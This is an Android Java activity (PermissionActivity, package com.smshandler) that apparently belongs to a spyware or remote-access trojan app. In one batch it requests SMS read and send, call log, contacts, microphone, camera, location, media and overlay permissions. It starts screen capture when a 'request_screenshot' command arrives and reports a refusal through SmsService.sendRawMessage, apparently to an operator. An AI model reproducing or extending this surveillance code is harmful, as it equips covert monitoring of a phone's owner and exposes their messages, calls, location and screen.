package com.smshandler;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class PermissionActivity extends Activity {

    private static final int REQ_SMS        = 100;
    private static final int REQ_OVERLAY    = 101;
    private static final int REQ_PROJECTION = 104;

    private boolean mScreenshotMode = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mScreenshotMode = getIntent() != null
            && getIntent().getBooleanExtra("request_screenshot", false);

        if (mScreenshotMode) {
            requestProjection();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())), REQ_OVERLAY);
                return;
            }
        }
        requestAllPermissions();
    }

    private void requestProjection() {
        MediaProjectionManager mgr =
            (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mgr.createScreenCaptureIntent(), REQ_PROJECTION);
    }

    private void requestAllPermissions() {
        String[] perms = buildPermissionList();
        boolean allOk = true;
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                allOk = false;
                break;
            }
        }
        if (!allOk) {
            ActivityCompat.requestPermissions(this, perms, REQ_SMS);
        } else {
            launchService();
        }
    }

    private String[] buildPermissionList() {
        List<String> list = new ArrayList<>();
        // Notification permission — same batch (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        list.add(Manifest.permission.READ_SMS);
        list.add(Manifest.permission.RECEIVE_SMS);
        list.add(Manifest.permission.SEND_SMS);
        list.add(Manifest.permission.READ_PHONE_STATE);
        list.add(Manifest.permission.CALL_PHONE);
        list.add(Manifest.permission.RECORD_AUDIO);
        list.add(Manifest.permission.ACCESS_FINE_LOCATION);
        list.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        list.add(Manifest.permission.READ_CALL_LOG);
        list.add(Manifest.permission.READ_CONTACTS);
        list.add(Manifest.permission.CAMERA);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.READ_MEDIA_IMAGES);
            list.add(Manifest.permission.READ_MEDIA_VIDEO);
            list.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            list.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
        }
        return list.toArray(new String[0]);
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_OVERLAY) {
            checkNotifPermission();
        } else if (req == REQ_PROJECTION) {
            if (res == RESULT_OK && data != null) {
                ScreenCaptureService.sResultCode = res;
                ScreenCaptureService.sResultData = data;
                Intent svc = new Intent(this, ScreenCaptureService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    startForegroundService(svc);
                else
                    startService(svc);
            } else {
                SmsService.sendRawMessage("❌ Screenshot permission denied.");
            }
            finish();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] res) {
        super.onRequestPermissionsResult(code, perms, res);
        launchService();
    }

    private void launchService() {
        Intent svcIntent = new Intent(this, SmsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svcIntent);
        } else {
            startService(svcIntent);
        }
        new Handler().postDelayed(this::finish, 200);
    }
}
